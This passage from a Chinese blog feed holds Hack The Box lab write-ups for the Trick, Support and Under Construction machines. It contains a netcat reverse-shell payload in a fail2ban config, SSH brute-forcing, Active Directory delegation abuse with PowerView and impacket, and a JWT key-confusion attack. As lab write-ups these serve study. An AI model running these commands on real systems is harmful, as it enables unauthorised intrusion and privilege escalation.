href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">这篇文章</a>获得提权方法：</p><p>比较重要的一个文件就是<code>iptables-multiport.conf</code>，修改该文件，利用该文件获得reverse shell,修改里面的actionban变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actionban: /usr/bin/nc &#123;your IP&#125; &#123;your listen port&#125; -e /usr/bin/bash</span><br></pre></td></tr></table></figure><p>这个时候重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/fail2ban restart</span><br></pre></td></tr></table></figure><p>首先<code>nc</code>本地监听自定义端口，错误登录ssh尝试运行自定义命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://trick.htb</span><br></pre></td></tr></table></figure><p>然后监听Terminal运行<code>cat /root/root.txt</code>拿到root.txt</p>]]></content>
      
      
      <categories>
          
          <category> Machine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
            <tag> LFI </tag>
            
            <tag> DNS AXFR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Support Machine Challenge</title>
      <link href="/2022/08/08/htb-support/"/>
      <url>/2022/08/08/htb-support/</url>
      
        <content type="html"><![CDATA[<h2 id="information"><a class="markdownIt-Anchor" href="#information"></a> Information</h2><h3 id="kerberos"><a class="markdownIt-Anchor" href="#kerberos"></a> Kerberos</h3><p>这是一种身份认证服务，是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。更为详细地概念及其工作流程可以参考网上。</p><h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3><p>全称LightWeight Directory Access Protocol，中文直译过来就是轻量目录访问协议。AD是Windows上最强大的功能，而AD是基于LDAP协议的一套解决方案，实现了<strong>谁可以以什么权限访问什么服务</strong>的功能；一下是Wikipedia的原文描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A client starts an LDAP session by connecting to an LDAP server, called a Directory System Agent (DSA), by default on TCP and UDP port 389, or on port 636 for LDAPS (LDAP over TLS/SSL, see below).[9] The client then sends an operation request to the server, and a server sends responses in return. With some exceptions, the client does not need to wait for a response before sending the next request, and the server may send the responses in any order. All information is transmitted using Basic Encoding Rules (BER). </span><br></pre></td></tr></table></figure><p>是一种类似于电话簿的东西，亦可以作为统一认证的解决方案，可以通过其简单目录和属性值来响应一些需求</p><h2 id="enumeration"><a class="markdownIt-Anchor" href="#enumeration"></a> Enumeration</h2><h3 id="端口遍历"><a class="markdownIt-Anchor" href="#端口遍历"></a> 端口遍历</h3><p>nmap可以查看到端口开放情况如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.174</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 989 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-08 14:54:06Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><p>53端口上运行的<code>Simple DNS Plus</code>是一个适用于Window的DNS服务器软件，我尝试寻找与其有关的漏洞，可是只找到了适用于一些特定版本的拒绝服务请求，很明显这里不是一个切入口，比较显眼的<code>Kerberos</code>和<code>LDAP</code>服务，这些都是之前没有遇到过的新东西，我花了一点事件去了解了一下，并且发现LDAP在OWASP TOP中有他的身影，比较常见的CVE是LDAP Injection，我觉得这可能是入侵目标机器的切入点，Kerberos就目前我所了解到的工作方式是安全性很高，不但需要客户机与AS进行验证，客户机与待访问的服务也需要验证。</p><h3 id="smb共享目录"><a class="markdownIt-Anchor" href="#smb共享目录"></a> SMB共享目录</h3><p>首先进入SMB共享目录看看有没有什么有用的线索，进行Shares枚举:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">support-tools   Disk      support staff tools</span><br><span class="line">SYSVOL          Disk      Logon server share </span><br></pre></td></tr></table></figure><p>IPC$一般如果配置不当，可能会让入侵者在错误的目录拿到很多有利于自己的信息，但是此台目标机IPC为空目录；NETLOGON和SYSVOL没有权限进行目录访问；可以进入的是一个工具分析目录，权限是公开的正如机器名字Support一样，可以看到里面有很多便携式工具，目录清单如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">7-ZipPortable_21.07.paf.exe</span><br><span class="line">npp.8.4.1.portable.x64.zip</span><br><span class="line">putty.exe</span><br><span class="line">SysinternalsSuite.zip</span><br><span class="line">UserInfo.exe.zip</span><br><span class="line">windirstat1_1_2_setup.exe</span><br><span class="line">WiresharkPortable64_3.6.5.paf.exe</span><br></pre></td></tr></table></figure><p><code>UserInfo.exe.zip</code>和<code>SysinternalsSuite.zip</code>格外显眼，其余的软件都是平时使用的日常软件，解压后发现<code>SysinternalsSuite.zip</code>只是微软的工具包，而<code>UserInfo.exe.zip</code>才是主角，尝试运行里面的<code>UserInfo.exe</code>提示需要电脑有.NET的运行环境，根据提示进行环境的配置后重新运行软件，软件提示有两个参数（除去 -v的可视化参数），有find和User两个参数。这里的查询操作让我困惑了许久，由于对于LDAP的查询很不熟，前导知识得知了LDAP Injection，所以错误地认为可以利用这里地find方法加-first和-last参数得到具有管理权限地账户，PS中输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./UserInfo.exe <span class="literal">-v</span> user <span class="literal">-username</span> <span class="string">&quot;administrator&quot;</span></span><br></pre></td></tr></table></figure><p>可以得到查询相应后的一条信息是账户最后修改密码时间。</p><h2 id="crack-it"><a class="markdownIt-Anchor" href="#crack-it"></a> Crack It!</h2><h3 id="net程序集反编译"><a class="markdownIt-Anchor" href="#net程序集反编译"></a> .NET程序集反编译</h3><p>我更换了入侵思路，于是通过Google搜寻到了<a href="https://github.com/dnSpy/dnSpy">dnSpy</a>是一个专门针对.NET程序地反编译工具，于是我利用此工具对UserInfo这个命令行程序进行了反编译，想尝试找到与LDAP直接进行通信的方法，因为软件想要和LDAP进行通行必然要建立一个LDAP协议的连接。<br />于是我在UserInfo.Services的Protected部分找到如下关键代码:</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">UserInfo.Services</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x02000006 RID: 6</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Protected</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">getPassword</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] array = Convert.FromBase64String(Protected.enc_password);</span><br><span class="line"><span class="built_in">byte</span>[] array2 = array;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ <span class="number">223</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Encoding.Default.GetString(array2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x04000005 RID: 5</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> enc_password = <span class="string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x04000006 RID: 6</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] key = Encoding.ASCII.GetBytes(<span class="string">&quot;armando&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ldap协议交互"><a class="markdownIt-Anchor" href="#ldap协议交互"></a> LDAP协议交互</h3><p>阅读代码后，根据如上的流程，我们可以得到对应的Python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc_password = <span class="string">b&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span></span><br><span class="line">key = <span class="string">b&quot;armando&quot;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">array = base64.b64decode(enc_password)</span><br><span class="line">array2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">    array2.append(<span class="built_in">chr</span>(array[i] ^ key[i % <span class="built_in">len</span>(key)] ^ <span class="number">223</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(array2))</span><br></pre></td></tr></table></figure><p>得到明文：<code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></p><p>根据反编译后得到的域，我们利用<code>OpenLDAP</code>的<code>ldapsearch</code>命令进行查询操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w <span class="string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -b <span class="string">&#x27;DC=support,DC=htb&#x27;</span> | grep info:</span><br></pre></td></tr></table></figure><p>我们可以得到一个名为support的Users的密码字段：<code>Ironside47pleasure40Watchful</code><br />我们再通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Ironside47pleasure40Watchful&quot;</span> &gt; password</span><br><span class="line">ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w <span class="string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -b <span class="string">&#x27;CN=Users,DC=support,DC=htb&#x27;</span> | grep name:</span><br></pre></td></tr></table></figure><p>把得到用户名字段复制到users.txt，合成一个小字典用crackmap工具对其进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm support.htb -u users.txt -p password</span><br></pre></td></tr></table></figure><h3 id="拿到user-flag"><a class="markdownIt-Anchor" href="#拿到user-flag"></a> 拿到User flag</h3><p>可以得到的是support是与其密码配对的账户，接着我们对其进行远程连接操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i support.htb -u support -p password</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\support&gt; whoami</span><br><span class="line">support\support                                                                                                                                 </span><br><span class="line">*Evil-WinRM* PS C:\Users\support&gt; type C:\Users\support\Desktop\user.txt</span><br><span class="line">8e4f1*****************b08f40</span><br></pre></td></tr></table></figure><h3 id="拿到root-flag"><a class="markdownIt-Anchor" href="#拿到root-flag"></a> 拿到Root flag</h3><p>Google <code>Kerberos Elevated Privilege</code>，这一找到这样的一篇<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">文章</a>,根据这篇文章的流程我们执行如下命令<br />导入需要用到的模块</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> <span class="literal">-uri</span> http://&#123;Your IP&#125;/Powermad.ps1 <span class="literal">-o</span> Powermad.ps1</span><br><span class="line"><span class="built_in">wget</span> <span class="literal">-uri</span> http://&#123;Your IP&#125;/PowerView.ps1 <span class="literal">-o</span> PowerView.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\Powermad.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br></pre></td></tr></table></figure><p>创建一个新的账户:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> fake01 <span class="literal">-Password</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;123456&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><p>查看ObjectSID:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> fake01 <span class="literal">-Properties</span> objectsid</span><br></pre></td></tr></table></figure><p>文章中说的是raw security descriptor</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&#123;Your New Account SID&#125;)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>应用上述规则</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> dc | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> dc <span class="literal">-Properties</span> <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="rubeusexe冒充ticket"><a class="markdownIt-Anchor" href="#rubeusexe冒充ticket"></a> Rubeus.exe冒充ticket</h4><p>文章后续就是用的这个方法</p><h4 id="impacket工具集过验证"><a class="markdownIt-Anchor" href="#impacket工具集过验证"></a> impacket工具集过验证</h4><p>除了之前测试UserInfo.exe工具在hosts设置的<code>support.htb</code>以外，还需要设置<code>dc.support.htb</code>，不然会出现服务无法访问的情况</p><p>请求票据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST support.htb/fake01:<span class="number">123456</span> -dc-ip <span class="number">10.10</span><span class="number">.11</span><span class="number">.174</span> -impersonate administrator -spn www/dc.support.htb</span><br></pre></td></tr></table></figure><p>利用冒充票据获取到管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k</span><br><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">97845d96*****************09c9</span><br></pre></td></tr></table></figure><h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2><p>这个算是我目前为止接触过最难的Machine，虽然HTB官方写的难度是Easy 😂.<br />主要是基础知识欠缺，在hack的时候很多知识都是新的，期待下学期开学后能够接触到Middle的机器。</p>]]></content>
      
      
      <categories>
          
          <category> Machine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> LDAP </tag>
            
            <tag> .NET debugger </tag>
            
            <tag> Kerberos Elevated Privilege </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Under Constraction Challenge</title>
      <link href="/2022/08/04/htb-under-constraction/"/>
      <url>/2022/08/04/htb-under-constraction/</url>
      
        <content type="html"><![CDATA[<h2 id="information"><a class="markdownIt-Anchor" href="#information"></a> Information</h2><h3 id="jwt介绍"><a class="markdownIt-Anchor" href="#jwt介绍"></a> JWT介绍</h3><p>JWT,JSON Web Token的缩写。在进行身份验证(Authorization)和信息交换(Information Exchange)是有用</p><p>JWT由三部分组成，之间用圆点连接，分别是<code>Header</code>,<code>Payload</code>,<code>Signature</code>,比较直观一点的JWT例子就是xxx.yyy.zzz</p><ul><li>Header :由token类型和算法名称两部分组成，结构如下：(需要二次base64转码)</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;alg&#x27;<span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;typ&#x27;<span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>Payload :关于实体和其他数据声明。声明有三种类型：registered、public、private</li></ul><p>最重要的是了解JWT是如何工作的：当用户用凭证进行成功登录后，JWT会返回一个token，之后就可以凭借这个token来请求服务了，但是问题就在于这个token对于时间周期是十分严格的，要保障安全，我们需要token保存的时间不超过我们需要用到token的时间。</p><p>JWT和Session都是用户验证用户的身份，但是由于Session是基于服务端的，而JWT是基于客户端的，所以在请求时需要将获取到的JWT放到header中一起发送。</p><ul><li>JWT固定参数:</li></ul><p><code>iss</code> :发行人</p><p><code>exp</code> :到期时间</p><p><code>sub</code> :主题</p><p><code>aud</code> :用户</p><p><code>nbf</code> :在此之前不可用</p><p><code>iat</code> :发布时间</p><p><code>jti</code> :JWT ID标记</p><h3 id="签署和加密"><a class="markdownIt-Anchor" href="#签署和加密"></a> 签署和加密</h3><blockquote><p>我从Oveflow上找到一下信息:</p></blockquote><ul><li><p>Signing:</p><ul><li>The private key is owned by the issuer and is used to compute the signature.</li><li>The public key can be shared with all parties that need to verify the signature.</li></ul></li><li><p>Encryption:</p><ul><li>The private key is owned by the recipient and is used to decrypt the data.</li><li>The public key can be shared to any party that want to send sensitive data to the recipient.</li></ul><p>简单来说就是签署只有服务提供方能够解密，而非对称加密需要你将你的公钥发放给需要给你发送加密文件的人，此后只有持有私钥的人才能对其进行解密</p></li></ul><h2 id="code-analyse"><a class="markdownIt-Anchor" href="#code-analyse"></a> Code Analyse</h2><p>访问给的URL,我们得到一样登录界面，尝试进行注册可以发现这个功能是正常可以使用的，但是我们进行登录后，观察到系统出现提示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Message from developers </span><br><span class="line">Welcome admin</span><br><span class="line">This site is under development.</span><br><span class="line">Please come back later. </span><br></pre></td></tr></table></figure><h3 id="文件目录"><a class="markdownIt-Anchor" href="#文件目录"></a> 文件目录:</h3><p>首先进行文件审查，第一步我们要知道文件里面的东西是干什么的，一下为文件目录</p><blockquote><p>提前给好了目标IP和源码，只需要解压源码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">d   4096 Feb 24  2020 helpers</span><br><span class="line">-    574 Feb 24  2020 index.js</span><br><span class="line">d   4096 Feb 24  2020 middleware</span><br><span class="line">d   4096 Aug  4 08:09 node_modules</span><br><span class="line">-    443 Feb 24  2020 package.json</span><br><span class="line">- 115733 Aug  4 08:09 package-lock.json</span><br><span class="line">d   4096 Feb 24  2020 routes</span><br><span class="line">d   4096 Aug  4 09:20 views</span><br></pre></td></tr></table></figure><h3 id="文件分析"><a class="markdownIt-Anchor" href="#文件分析"></a> 文件分析</h3><ul><li>[d] helpers<ul><li>DBhelper.js</li></ul><blockquote><p>存在函数getUser、checkUser、createUser、attemptLogin，功能跟名字一样，这个库文件中在对数据库进行查询时并没有对输入参数进行筛查，所以可以初步判定目标是存在SQL注入漏洞的</p></blockquote><ul><li>存在函数sign进行签名、decode进行解密</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">sign</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    data = <span class="title class_">Object</span>.<span class="title function_">assign</span>(data, &#123;<span class="attr">pk</span>:publicKey&#125;);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">await</span> jwt.<span class="title function_">sign</span>(data, privateKey, &#123; <span class="attr">algorithm</span>:<span class="string">&#x27;RS256&#x27;</span> &#125;))</span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">decode</span>(<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">await</span> jwt.<span class="title function_">verify</span>(token, publicKey, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;RS256&#x27;</span>, <span class="string">&#x27;HS256&#x27;</span>] &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>middleware\AuthMiddleware.js<blockquote><p>是否登录进行验证，没有登录就重置url到/auth，存在JWT就进行解密获取到username</p></blockquote></li><li>routes\index.js</li><li>[d] views<blockquote><p>前端页面</p></blockquote></li><li>index.js<blockquote><p>大概是部署脚本？</p></blockquote></li><li>package.json<blockquote><p>项目依赖</p></blockquote></li></ul><p><strong>PS:js代码不怎么会，只能看懂一部分，需要补充一下这部分的空缺了。。</strong></p><h3 id="拿到public-key"><a class="markdownIt-Anchor" href="#拿到public-key"></a> 拿到Public Key</h3><p>看完了代码，我觉得值得我留意的是Google<code>jsonwebtoken vulnerabilities</code>后得到的有记录的<code>CVE-2015-9235</code>:</p><p>漏洞描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In jsonwebtoken node module before 4.2.2 it is possible for an attacker to bypass verification when a token digitally signed with an asymmetric key (RS/ES family) of algorithms but instead the attacker send a token digitally signed with a symmetric algorithm (HS* family).</span><br></pre></td></tr></table></figure><p>在helpers目录下存在<code>JWThelper.js</code>,通过访问浏览器开发者工具，我在cookie一栏找到了<code>session</code>将其值在 <a href="https://jwt.io/" title="JWT.IO allows you to decode, verify and generate JWT.">JWT.io</a>进行了解密,从payload中找到了Public Key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY</span><br><span class="line">ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi</span><br><span class="line">XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg</span><br><span class="line">jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH</span><br><span class="line">+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx</span><br><span class="line">V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr</span><br><span class="line">0wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><h2 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h2><h3 id="实现任意账户存在登录"><a class="markdownIt-Anchor" href="#实现任意账户存在登录"></a> 实现任意账户（存在）登录</h3><p>我在网上搜寻了一些关于jwt弱点的知识，得知了JWT confusion attack，由于jwt在进行非对称加密时，我们唯一能够得到的是服务器给我们的公钥，所以我们能够在配置有HS256对称密匙算法的目标机器上进行攻击，接下来就是对我们修改过的token利用公钥进行签名。</p><p>我在GitHub上发现了一个专注于JWT的工具集<code>jwt_tools</code>,依据程序内置的帮助手册，我使用一下命令对token进行了修改和签名:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt_tool.py $(<span class="built_in">cat</span> jwt.txt) -X k -py public.key -I -pc username -py admin</span><br></pre></td></tr></table></figure><blockquote><p>jwt是我以test用户名注册的时候，本地签署的token值，<code>-X k</code> 密匙混淆攻击 模式,<code>-I</code>是更新claim（增加新的claim）<code>-pc</code>和<code>-py</code>分别是指示payload内元素名称和值</p></blockquote><p>运行以上命令后，我们得到了新的token，此后只需要修改-py后的内容我们就可以登录任意账户。</p><h3 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h3><p>一下我列出了后台处理用户名的关键代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title class_">AuthMiddleware</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> user = <span class="keyword">await</span> <span class="title class_">DBHelper</span>.<span class="title function_">getUser</span>(req.<span class="property">data</span>.<span class="property">username</span>);</span><br><span class="line">        <span class="keyword">if</span> (user === <span class="literal">undefined</span>) &#123;</span><br><span 